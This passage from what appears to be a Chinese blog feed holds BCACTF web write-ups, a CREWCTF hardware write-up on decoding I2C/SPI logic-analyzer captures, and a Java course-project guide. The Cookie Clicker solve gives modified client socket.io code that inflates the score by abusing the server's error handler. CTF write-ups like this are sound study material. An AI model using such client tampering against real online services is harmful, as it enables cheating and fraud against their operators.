<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;rtnValues&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;Ricardo Olsen&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;April Park&quot;</span><span class="hljs-punctuation">,</span><br>        ......<br>        <span class="hljs-string">&quot;Shirley Cannon&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;Lowell Cochran&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;Flag Holder&quot;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>发现最后有个<code>Flag Holder</code>，于是我们访问<code>/51/Flag/Holder</code>得到<code>flag</code>。</p>
<h2 id="Sea-Scavenger"><a href="#Sea-Scavenger" class="headerlink" title="Sea Scavenger"></a>Sea Scavenger</h2><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>入门题目，灰常简单。</p>
<h2 id="Cookie-Clicker"><a href="#Cookie-Clicker" class="headerlink" title="Cookie Clicker"></a>Cookie Clicker</h2><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h4><p>给了一个曲奇饼-点击界面，点一下分数+1</p>
<p>查看js代码，看到了这样一串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sendMessage</span> &#123;<br>    power = <span class="hljs-number">1</span><br>    value = <span class="hljs-number">0</span><br>&#125;<br>cookie.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>    socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<span class="hljs-string">&quot;power&quot;</span>:send.<span class="hljs-property">power</span>, <span class="hljs-string">&quot;value&quot;</span>:send.<span class="hljs-property">value</span>&#125;));<br>&#125;);<br></code></pre></td></tr></table></figure>
<p>替换一下内容</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf">class sendMessage &#123;<br>    power <span class="hljs-operator">=</span> <span class="hljs-number">1</span>e100<br>    value <span class="hljs-operator">=</span> <span class="hljs-number">1</span>e100<br>&#125;<br></code></pre></td></tr></table></figure>
<p>多次尝试，发现分数跳动但是最终没有改变，怀疑是竞争性条件。</p>
<p>仔细阅读源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 当收到错误消息时，更新会话的分数，并将分数发送给socket</span><br>socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;receivedError&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> &#123;<br>    sessions[socket.<span class="hljs-property">id</span>] = errors[socket.<span class="hljs-property">id</span>]<br>    socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;recievedScore&#x27;</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<span class="hljs-string">&quot;value&quot;</span>:sessions[socket.<span class="hljs-property">id</span>]&#125;));<br>&#125;);<br></code></pre></td></tr></table></figure>
<p>发现只有客户端回复了<code>receivedError</code>，才会更新分数。</p>
<p>故而修改客户端代码如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> socket = <span class="hljs-title function_">io</span>();<br><br><span class="hljs-keyword">let</span> cookie = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;img&quot;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sendMessage</span> &#123;<br>    power = <span class="hljs-number">1e100</span><br>    value = <span class="hljs-number">1e100</span><br>&#125;<br><br><span class="hljs-keyword">let</span> send = <span class="hljs-keyword">new</span> <span class="hljs-title function_">sendMessage</span>();<br><br>cookie.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>    socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<span class="hljs-string">&quot;power&quot;</span>:send.<span class="hljs-property">power</span>, <span class="hljs-string">&quot;value&quot;</span>:send.<span class="hljs-property">value</span>&#125;));<br>&#125;);<br><br>socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;recievedScore&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;<br>    <span class="hljs-keyword">let</span> scores = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(msg)<br>    send.<span class="hljs-property">value</span> = scores.<span class="hljs-property">value</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;.points&quot;</span>).<span class="hljs-property">textContent</span> = scores.<span class="hljs-property">value</span><br>&#125;);<br><br>socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">msg</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Error&quot;</span>)<br>    socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;receivedError&#x27;</span>, <span class="hljs-string">&quot;recieved&quot;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>
<p>点击两次，获得flag。<code>bcactf&#123;H0w_Did_Y0u_Cl1ck_S0_M4ny_T1mes_123&#125;</code></p>
<h2 id="Tic-Tac-Toe"><a href="#Tic-Tac-Toe" class="headerlink" title="Tic-Tac-Toe"></a>Tic-Tac-Toe</h2><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h4><p>井字棋，前后端通信为websocket</p>
<h4 id="wp-6"><a href="#wp-6" class="headerlink" title="wp"></a>wp</h4><p>测试发现，游戏逻辑有漏洞，注释掉这一段即可获取flag。</p>
<img src="/2024/07/15/BCACTF-1/tic-tac-toe.png" class="">

]]></content>
      <categories>
        <category>ctfwp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>BCACTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CREWCTF_2024_misc_Sniff</title>
    <url>/2024/08/08/CREWCTF-2024-misc-Sniff/</url>
    <content><![CDATA[<p>记录一下两道硬件方向比较有意思的题目。</p>
<h2 id="Sniff-One"><a href="#Sniff-One" class="headerlink" title="Sniff One"></a>Sniff One</h2><span class="label label-success">Author: Oshawk, Solved: 27, Pts: 281</span>
<div class="note note-info">
            <p>A two part challenge.</p><p>See the README in the download for details.</p><ul><li>附件 <a href="/2024/08/08/CREWCTF-2024-misc-Sniff/dist.zip" title="dist.zip">dist.zip</a></li></ul>
          </div>

<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>打开附件包，作者给了几个文件，一个说明手册，以及名为<code>capture.sal</code>的逻辑分析仪数据文件。</p>
<p>说是两道题，但其实是分析同一个文件。第一道题让我们找找作者用键盘输入了什么。</p>
<p>根据逻辑分析仪的型号<code>saleae</code>，去到它的官网下载对应的分析软件，<a href="https://www.saleae.com/zh-hans/pages/downloads">下载链接</a>。</p>
<p>使用分析软件打开<code>capture.sal</code>，缩小视图后，可以发现信号大致分为两段，且主要集中于<code>channel 0 1 5 6</code></p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/1.png" class="">

<p>接着打开作者给的说明手册，来找找关于键盘相关的信息：</p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/2.jpg" class="">
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/3.jpg" class="">

<ul>
<li>键盘制造商 <a href="http://www.m5stack.com/">www.M5Stack.com</a></li>
<li>键盘接线：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">线的颜色</th>
<th align="center">作用</th>
<th align="center">对应在逻辑分析仪的通道</th>
</tr>
</thead>
<tbody><tr>
<td align="center">黑</td>
<td align="center">gnd</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">红</td>
<td align="center">vcc</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">白</td>
<td align="center">data</td>
<td align="center"><code>Channel 0</code></td>
</tr>
<tr>
<td align="center">黄</td>
<td align="center">data</td>
<td align="center"><code>Channel 1</code></td>
</tr>
</tbody></table>
<p>于是乎，在官网查询键盘相关的信息，得到以下信息：</p>
<blockquote>
<p><code>CardKB1.1</code> 是一款卡片尺寸的QWERTY 50键 PCB 矩阵键盘, 使用 ATMega8A 作为编码MCU, 输出接口为 <code>I2C</code> . 板载 1颗 RGB-LED 以显示键盘状态.</p>
</blockquote>
<p>使用I2C协议通讯，回到逻辑分析软件，针对<code>Channel 0</code>和<code>Channel 1</code>添加I2C分析器，如下图。</p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/4.png" class="">

<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/5.png" class="">

<p>可以发现，在<code>data</code>列，出现了一些明文字符。将<code>data</code>列导出到csv，去除<code>\0</code>，拼接后得到字符串：</p>
<blockquote>
<p>Data\xFAz\x03\x0C\x0C\x152023-05-24 11:08:45.0\xFAz\x03\x0C\x0C\x152023-05-24 11:08:45.0\x01\x01flag{7\x0117f75\x0132}\x01\r\x01</p>
</blockquote>
<p>其中flag中有不可打印字符，估计是人手接触电路板时产生的干扰信号，将其舍去，最终flag为 <code>flag&#123;717f7532&#125;</code></p>
<h2 id="Sniff-Two"><a href="#Sniff-Two" class="headerlink" title="Sniff Two"></a>Sniff Two</h2><span class="label label-success">Author: Oshawk, Solved: 16, Pts: 390</span>
<div class="note note-info">
            <p>A two part challenge.</p><p>See the README in the download for details. ( same attachment as sniff one )</p>
          </div>
<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p>第二题让我们找到墨水屏上显示的内容，相对更难。</p>
<p>根据文档，找到墨水屏的相关资料：</p>
<p>第一步先来理清楚接线，根据文档中的接线图、树莓派引脚以及墨水屏引脚文档整理出每条线的作用。</p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/6.png" class="">

<p><a href="https://pinout.xyz/pinout/inky_phat">https://pinout.xyz/pinout/inky_phat</a></p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/7.png" class="">

<table>
<thead>
<tr>
<th align="center">线材颜色</th>
<th align="center">作用</th>
<th align="center">逻辑分析仪接口</th>
</tr>
</thead>
<tbody><tr>
<td align="center">黑</td>
<td align="center">gcc</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">灰</td>
<td align="center">I2C1 SDA</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">白</td>
<td align="center">gnd</td>
<td align="center">G</td>
</tr>
<tr>
<td align="center">紫</td>
<td align="center">I2C1 SCL</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">青</td>
<td align="center">busy</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">黄</td>
<td align="center">reset</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">红</td>
<td align="center">spi0 mosi</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">土黄</td>
<td align="center">spi0 sclk</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">蓝</td>
<td align="center">Chip select</td>
<td align="center">7</td>
</tr>
</tbody></table>
<p>查询墨水屏相关信息<br><a href="https://shop.pimoroni.com/products/inky-phat?variant=12549254905939">https://shop.pimoroni.com/products/inky-phat?variant=12549254905939</a><br>得知通信协议是<code>spi</code>或者<code>i2c</code>，但<code>i2c</code>已经在第一题被占用了，故而猜测使用<code>spi</code>协议。<br>在分析软件中添加<code>anlayzer</code>，格式如下。</p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/8.png" class="">

<p>于是我们能在<code>console</code>中得到数据输出：</p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/9.png" class="">

<p>复制到vscode中，进行数据清洗</p>
<ol>
<li><p>替换所有<code>/0x00</code>为空，目的是只保留<code>mosi</code>线的数据。</p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/10.png" class=""></li>
<li><p>除了数据体量很大的两行，删除其他行，目的是去除非墨水屏像素数据。</p>
</li>
<li><p>将<code>十六进制</code>转为<code>二进制</code>，清除空格。</p>
</li>
<li><p>不难观察到01以一种规律的形式排布。</p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/11.png" class="">
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/12.png" class="">
</li>
<li><p>存为<code>01.txt</code>，用python画图。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 读入01.txt, 以273像素为一行，如果是1则为黑色，如果是0则为白色</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;01.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    width = <span class="hljs-number">272</span><br>    height = <span class="hljs-built_in">len</span>(data) // width<br>    img = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (width, height))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), <span class="hljs-built_in">int</span>(data[i * width + j]))<br>    img.save(<span class="hljs-string">&quot;01.png&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solve()<br></code></pre></td></tr></table></figure></li>
<li><p>结果如下</p>
<img src="/2024/08/08/CREWCTF-2024-misc-Sniff/13.png" class="">
</li>
<li><p>估计这款墨水屏的工作原理是分块刷新。</p>
</li>
<li><p>flag{ec9cf2b7}。</p>
</li>
</ol>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p><a href="https://www.bilibili.com/video/BV1Gg4y1B7nZ">bilibili- 墨水屏的工作原理以及如何驱动墨水屏工作</a></p>
]]></content>
      <categories>
        <category>ctfwp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>CREWCTF</tag>
        <tag>hardware</tag>
      </tags>
  </entry>
  <entry>
    <title>CS109_Project_HappyMatch</title>
    <url>/2023/12/29/CS109-Project-HappyMatch/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>本文记录了一些写CS109计算机程序设计基础期末project过程中的开发经验以及使用到的技术(这部分老师大概率不会讲，得自学)。</p>
<h1 id="SUSTechCS109ProjectGuide"><a href="#SUSTechCS109ProjectGuide" class="headerlink" title="SUSTechCS109ProjectGuide"></a>SUSTechCS109ProjectGuide</h1><p><a href="https://blog.froster.icu/SUSTechCS109ProjectGuide/" title="SUSTechCS109ProjectGuide">SUSTechCS109ProjectGuide</a>是一篇学长写的project指南，里面写有许多有价值的建议，非常值得一看。</p>
<h1 id="关于提问"><a href="#关于提问" class="headerlink" title="关于提问"></a>关于提问</h1><p>开发的过程中难免会遇到很多陌生的问题或者bug，如果有时间，建议学习一下<a href="https://github.com/tvvocold/How-To-Ask-Questions-The-Smart-Way" title="How-To-Ask-Questions-The-Smart-Way">提问的智慧</a>。</p>
<p>如果时间短缺，记住<code>善用AI工具 &gt; 搜索引擎 &gt; 询问他人</code>。提出问题的时候，请提供<code>清晰的截图</code><del>不要再用手机拍你的屏幕了</del>、<code>有用的报错信息</code>、<code>详细完整的问题描述</code>，这会大大增加你解决问题的效率。</p>
<h1 id="关于项目"><a href="#关于项目" class="headerlink" title="关于项目"></a>关于项目</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>每学期的project都是对于某一种游戏玩法的复刻，而2023秋学期的主题是<code>三消游戏</code>，和主题相关的游戏有俄罗斯方块，开心消消乐等。</p>
<h2 id="题目发布时间"><a href="#题目发布时间" class="headerlink" title="题目发布时间"></a>题目发布时间</h2><p>详细的题目文档会在<code>期中前后</code>发布，总共的开发周期有5-6周左右。</p>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><a href="/2023/12/29/CS109-Project-HappyMatch/cs109-2023F-project.pdf" title="pdf">pdf</a>
<h2 id="分数组成"><a href="#分数组成" class="headerlink" title="分数组成"></a>分数组成</h2><p>跟据本学期和往年的经验，分数由80%的基础分和20%的bonus分数组成。</p>
<ul>
<li>80%基础分数跟据题目文档判定</li>
<li>另外20%分数为bonus分，跟据几个维度判断：美观程度、额外功能、开发流程(比如有没有用git)、有无明显bug等等</li>
</ul>
<h2 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h2><p>题目发布的同时，老师也会给出一个实现了部分功能的demo。你可以把这个理解成是一个框架，在这个基础框架上去完成你的项目。</p>
<p>但是对于有水平的同学，我建议不使用老师所给的框架。理由如下：</p>
<ol>
<li>老师给出的框架大概率是Swing写的图形化界面，相比于Swing，更建议使用JavaFX。</li>
<li>有些地方可能受到框架限制，没法实现自己想要的功能。</li>
<li>不使用老师给的框架有加分…</li>
</ol>
<h2 id="项目设计"><a href="#项目设计" class="headerlink" title="项目设计"></a>项目设计</h2><p>建议在拿到project题目的第一时间，对你的项目整体进行规划(比如要做出哪些界面，实现哪些功能)，和队友商量好分工，并且制定好详细的计划。按照计划有的放矢，就不会出现只剩一周还没开始写的情况。<del>听说很多人答辩前熬大夜</del></p>
<p>先放一个我在初期写的计划的框架。<strong>可以使用类似语雀等软件与你的队友共享文档，同步需求。</strong></p>
<img src="/2023/12/29/CS109-Project-HappyMatch/plan.png" class="" title="plan">

<p>想要对项目有个整体的把握，不仅需要熟悉需求文档，还要仔细分析每个功能具体的实现。</p>
<h1 id="关于AI工具的使用"><a href="#关于AI工具的使用" class="headerlink" title="关于AI工具的使用"></a>关于AI工具的使用</h1><p>本人极力提倡在开发的过程中使用AI工具，目的及理由如下(chatGPT生成)：</p>
<ul>
<li>提高开发效率：AI可以自动化一些重复性和繁琐的任务，如代码补全、缺陷检测和测试等，从而减少开发人员的工作量，提高开发效率。</li>
<li>提高代码质量：AI可以帮助开发人员发现潜在的缺陷和错误，并提供修复建议。它还可以生成高质量的代码，减少人为错误的产生。</li>
<li>加速学习和开发过程：AI可以根据开发人员的需求快速生成代码，从而加速学习和开发过程。它可以提供示例代码、算法实现和框架结构，帮助开发人员快速上手和实现想法。</li>
</ul>
<p>在开发的过程中，对我帮助最大的莫过于copilot和chatGPT，前者提供了非常只能的代码补全功能，极大地加快了开发效率；后者不仅能帮你快速学习新的知识，还能帮你debug一些不常见的疑难杂症。</p>
<p>ps. AI工具只能作为你的开发助手，不要想让它帮你完成整个project。</p>
<h2 id="copilot"><a href="#copilot" class="headerlink" title="copilot"></a>copilot</h2><p><del>非常好用，用到就是赚到，强力安利</del><br><br>通过Github的学生认证即可食用，网上教程很多，搜索一下即可。</p>
<img src="/2023/12/29/CS109-Project-HappyMatch/copilot.gif" class="" title="copilot">

<h1 id="简单的算法"><a href="#简单的算法" class="headerlink" title="简单的算法"></a>简单的算法</h1><p>写project前老师可能会布置一些相关的作业题，让你熟悉对应的游戏算法。</p>
<h2 id="消除连续的方块"><a href="#消除连续的方块" class="headerlink" title="消除连续的方块"></a>消除连续的方块</h2><p><code>8*8</code>的地图分为两份，一份对行进行扫描，另一份对列经行扫描，存在三个以上相连的部分就标记为<code>&#39;0&#39;</code>,最后对两张地图进行整合，去除所有标记为<code>&#39;0&#39;</code>的方块。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>(未校验)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span>[][] match(<span class="hljs-type">char</span>[][] map, <span class="hljs-type">char</span>[][] map1) &#123;<br>    <span class="hljs-comment">// 行、列消除</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; k &lt;= <span class="hljs-number">8</span>; k++) &#123; <span class="hljs-comment">// 三连到八连的情况</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; map.length; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; map[i].length; j++) &#123;<br>                <span class="hljs-keyword">if</span> (checkConsecutive(map, i, j, k, <span class="hljs-string">&#x27;0&#x27;</span>)) &#123;<br>                    markConsecutive(map, i, j, k, <span class="hljs-string">&#x27;0&#x27;</span>);<br>                    j += k - <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; map1[<span class="hljs-number">0</span>].length; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; map1.length; j++) &#123;<br>                <span class="hljs-keyword">if</span> (checkConsecutive(map1, j, i, k, <span class="hljs-string">&#x27;0&#x27;</span>)) &#123;<br>                    markConsecutive(map1, j, i, k, <span class="hljs-string">&#x27;0&#x27;</span>);<br>                    j += k - <span class="hljs-number">1</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 整合</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; map.length; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; map[i].length; j++) &#123;<br>            map[i][j] = (map[i][j] == <span class="hljs-string">&#x27;0&#x27;</span> || map1[i][j] == <span class="hljs-string">&#x27;0&#x27;</span>) ? <span class="hljs-string">&#x27;0&#x27;</span> : map[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map;<br>&#125;<br><br><span class="hljs-comment">// 检查是否存在连续的字符</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkConsecutive</span><span class="hljs-params">(<span class="hljs-type">char</span>[][] map, <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">int</span> length, <span class="hljs-type">char</span> target)</span> &#123;<br>    <span class="hljs-keyword">if</span> (col + length &gt; map[row].length) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (map[row][col + i] != target) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// 标记连续的字符</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">markConsecutive</span><span class="hljs-params">(<span class="hljs-type">char</span>[][] map, <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">int</span> length, <span class="hljs-type">char</span> mark)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>        map[row][col + i] = mark;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="让悬空的方块掉落"><a href="#让悬空的方块掉落" class="headerlink" title="让悬空的方块掉落"></a>让悬空的方块掉落</h2><p>遍历即可，还可以加入一些特殊的判断，比如边界、禁止方块等。</p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">fall</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] map)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">width</span> <span class="hljs-operator">=</span> map[<span class="hljs-number">0</span>].length;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> map.length;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; x &lt; width; x++) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">emptyY</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> height - <span class="hljs-number">1</span>; y &gt;= <span class="hljs-number">0</span>; y--) &#123;<br>            <span class="hljs-keyword">if</span> (map[y][x] == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">if</span> (emptyY == -<span class="hljs-number">1</span>) &#123;<br>                    emptyY = y;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (map[y][x] != -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">if</span> (emptyY != -<span class="hljs-number">1</span>) &#123;<br>                    map[emptyY][x] = map[y][x];<br>                    map[y][x] = <span class="hljs-number">0</span>;<br>                    emptyY--;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (map[y][x] == -<span class="hljs-number">1</span>) &#123;<br>                emptyY = -<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="技术部分"><a href="#技术部分" class="headerlink" title="技术部分"></a>技术部分</h1><p>这部分存在一些超纲知识，如果对你来说太难了，可以跳过不看~。</p>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="什么是Git"><a href="#什么是Git" class="headerlink" title="什么是Git"></a>什么是Git</h3><p>Git是一种分布式版本控制系统，用于跟踪和管理软件开发项目中的代码变更。它被广泛用于协作开发和版本管理，可以帮助团队成员在不同的开发环境中协同工作，并记录每个修改的历史。</p>
<h3 id="如何使用GitHub"><a href="#如何使用GitHub" class="headerlink" title="如何使用GitHub"></a>如何使用GitHub</h3><p>GitHub 教程：<a href="https://zhuanlan.zhihu.com/p/369486197">https://zhuanlan.zhihu.com/p/369486197</a></p>
<h2 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h2><h3 id="Swing"><a href="#Swing" class="headerlink" title="Swing"></a>Swing</h3><p>Swing是一个比较传统的GUI框架，由于课程中会讲解swing以及本人用了JavaFX，这里做简单介绍。</p>
<blockquote>
<p>ChatGPT : Swing是Java平台上的一套GUI（图形用户界面）工具包，它提供了一系列的组件和工具，用于构建桌面应用程序的用户界面。下面是一些关键的概念和组件，帮助你入门Swing：</p>
<ul>
<li>JFrame：JFrame是Swing中的顶级窗口组件，它代表了一个可调整大小的窗口。你可以创建一个JFrame对象，并在其中添加其他组件，如按钮、文本框等。</li>
<li>JPanel：JPanel是Swing中的容器组件，用于组织和布局其他组件。你可以将多个组件添加到JPanel中，并使用布局管理器来控制它们的位置和大小。</li>
<li>JButton：JButton是一个按钮组件，用于触发特定的操作。你可以创建一个JButton对象，并为其设置文本、图标和事件处理程序，以便在用户点击按钮时执行相应的操作。</li>
<li>JLabel：JLabel是一个标签组件，用于显示文本或图像。你可以创建一个JLabel对象，并将其添加到窗口中，以显示一些静态文本或图像。</li>
<li>JTextField：JTextField是一个文本框组件，用于接收用户的输入。你可以创建一个JTextField对象，并将其添加到窗口中，以便用户可以输入文本。</li>
<li>LayoutManager：布局管理器是Swing中用于管理组件布局的工具。Swing提供了多种布局管理器，如FlowLayout、BorderLayout和GridLayout等，它们可以帮助你自动调整和排列组件的位置和大小。</li>
<li>事件处理：Swing使用事件模型来处理用户的交互操作，例如点击按钮、输入文本等。你可以为组件注册事件监听器，并在事件发生时执行相应的操作。</li>
<li>这只是Swing的一小部分内容，它还提供了许多其他组件和功能，如复选框、下拉列表、对话框等。你可以通过阅读Swing的官方文档或参考一些教程和示例来深入学习和实践Swing。开始使用Swing时，建议从简单的示例开始，逐步探索并构建更复杂的界面。祝你在学习Swing的过程中取得成功！</li>
</ul>
</blockquote>
